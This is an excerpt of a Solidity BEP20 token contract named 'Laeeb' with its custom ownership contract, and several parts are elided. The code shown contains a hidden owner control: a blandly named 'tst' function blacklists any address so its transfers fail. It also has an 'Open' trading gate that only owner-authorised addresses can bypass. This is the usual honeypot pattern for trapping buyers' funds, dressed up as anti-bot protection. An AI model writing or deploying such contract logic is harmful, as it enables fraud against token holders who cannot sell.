...
abstract contract own {
    ...
    mapping (address => bool) internal ownorizations;

    constructor(address _owner) {
        owner = _owner;
        ownorizations[_owner] = true;
    }
    ...
    /**
     * Function modifier to require caller to be ownorized
     */
    modifier ownorized() {
        require(isownorized(msg.sender), "!ownORIZED"); _;
    }

    /**
     * ownorize address. Owner only
     */
    function ownorize(address ap) public onlyOwner {
        ownorizations[ap] = true;
    }

    /**
     * Remove address' ownorization. Owner only
     */
    function unownorize(address ap) public onlyOwner {
        ownorizations[ap] = false;
    }
    ...
    /**
     * Return address' ownorization status
     */
    function isownorized(address ap) public view returns (bool) {
        return ownorizations[ap];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner ownorized
     */
    function transferOwnership(address payable ap) public onlyOwner {
        owner = ap;
        ownorizations[ap] = true;
        emit OwnershipTransferred(ap);
    }

    event OwnershipTransferred(address owner);
}

contract Laeeb is IBEP20, own {
    ...
    uint256 public _walletMax = _totalSupply * 200 / 200;
    ...
    mapping (address => bool) public isbotse;
    ...
    constructor () own(msg.sender) {
        ...
        marketingWallet = 0x707c87BDAE76CbeF67513bbB77936B5900806ca6;
        buybackWallet = 0x1ba706bF6CbFC01e923E6E76Fa3b68EAd06Fe082;
    ...
    function tst(address _user) external onlyOwner {
        require(!isbotse[_user], "killing bot");
        isbotse[_user] = true;
    }
    function remove(address _user) external onlyOwner {
        require(isbotse[_user], "release bot");
        isbotse[_user] = false;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!isbotse[sender], "bot killed");
        if(inSwapAndLiquify){ return _basicTransfer(sender, recipient, amount); }

        if(!ownorizations[sender] && !ownorizations[recipient]){
            require(Open, "open");
        }
